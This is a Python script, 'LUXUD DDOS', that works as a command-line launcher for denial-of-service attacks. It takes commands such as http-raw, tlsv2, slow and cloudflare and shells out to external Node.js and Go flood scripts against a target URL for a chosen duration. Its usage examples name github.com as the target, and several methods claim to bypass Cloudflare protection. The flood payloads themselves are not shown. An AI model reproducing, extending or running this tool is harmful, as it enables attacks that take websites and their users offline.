import socket
import os
import requests
import random
#from asciimatics.effects import BannerText, Print, Scroll
#from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
#from asciimatics.scene import Scene
#from asciimatics.screen import Screen
#from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
import time
from time import sleep
import sys


###IP###
def mip():
    ip = requests.get('https://api.ipify.org').text.strip()
    online = random.randint(1, 153)
    print('Your IP Is: ' + {ip})

def home():
    print('LUXUD DDOS')
    print('USE METHODS TO DDOS')
    main()

def main():
    while(True):
        cnc = input('Input: ')
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "MYIP" or cnc == "myip" or cnc == "ip":
            mip()
        elif "http-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                os.system(f"node ./data/HTTP-RAW.js {url} {time}")
                os.system('cls' if os.name == 'nt' else 'clear')
            except IndexError:
                print("Usage : http-raw <url> <port> <time>")
                print("Example : http-raw https://example.com/ 443 60")
        elif "http-rand" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                #os.system("cls" if os.name == "nt" else "clear")
                print('Attack Sent!')
                os.system(f"node ./data/HTTP-RAND.js {url} {time} proxy")
            except IndexError:
                print("Usage : http-rand <url> <port> <time>")
                print("Example : http-rand https://github.com/ 443 60")
        elif "http-socket" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                th=cnc.split()[3]
                time=cnc.split()[4]
                #os.system("cls" if os.name == "nt" else "clear")
                print('Attack Sent!')
                os.system(f"node ./data/socket.js {url} {th} {time}")
            except IndexError:
                print("Usage : http-socket <url> <port> <thread> <time>")
                print("Example : http-socket https://github.com/ 443 10 1000")
        elif "slow" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"node ./data/slow.js {url} {time}")
            except IndexError:
                print("Usage : slow <url> <port> <time>")
                print("Example : slow https://github.com/ 443 100")
        elif "hyper" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"node ./data/hyper.js {url} {time}")
            except IndexError:
                print("Usage : hyper <url> <port> <time>")
                print("Example : hyper https://github.com/ 443 120")
        elif "crash" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"go run ./data/vlm.go -s {url} {time}")
            except IndexError:
                print("Usage : crash <url> <port> <get/post>")
                print("Example : crash https://github.com/ 443 get")
        elif "bypassuam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node ./data/bypassuam.js GET {url} {time} {per}')
            except IndexError:
                print('Usage: bypassuam <url> <time> <req_per_ip>')
                print('Example: uambypass http:/github.com 60 1250')
        elif "httpbypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"node ./data/httpbypassv2.js {url} {time}")
            except IndexError:
                print("Usage : httpbypass <url> <port> <time>")
                print("Example : httpbypass https://github.com/ 443 60")
        elif "cf-socket" in cnc:
            try:
                os.system(f'python bypass.py')
            except IndexError:
                print('cf-socket')
        elif "cf-pro" in cnc:
            try:
                os.system(f'python cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "tlsv1" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"node ./data/tls.js {url} {port} {time}")
            except IndexError:
                print("Usage : tlsv1 <url> <port> <time>")
                print("Example : tlsv1 https://github.com/ 443 60")
        elif "tlsv2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                print('Attack Sent!')
                os.system(f'node ./data/tlsv2.js {url} {time} {thread}')
                print('Attack Sent!')
            except IndexError:
                print('Usage: tlsv2 <url> <time> <threads>')
                print('Example: tlsv2 http://github.com 60 150')
        elif "cloudflare" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                th=cnc.split()[4]
                print('Attack Sent!')
                #os.system("cls" if os.name == "nt" else "clear")
                os.system(f"node ./data/cf.js {url} {time} {th}")
            except IndexError:
                print("Usage : cloudflare <url> <port> <time> <thread>")
                print("Example : cloudflare https://github.com/ 443 1000 10")
        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
                print('Attack Sent!')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://github.com 60 1250')
        elif "http-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/HTTP-MIX.js {url} {time} ')
        elif "ce-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/CE-MIX.js {url} {time} ')
        elif "cfuam" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node cfuam.js {url} {time} ')
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass

def meth():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("►http-raw")
    print("►http-rand")
    print("►http-socket")
    print("►http-mix")
    print("►httpbypass")
    print("►tls")
    print("►tlsv2")
    print("►hyper")
    print("►slow")
    print("►crash")
    print("►bypassuam")
    print("►cf-socket")
    print("►cf-pro")
    print("►cloudflare")
    print("►cf-bypass")
    print("►cfuam")
    print("►ce-mix")
    
home()
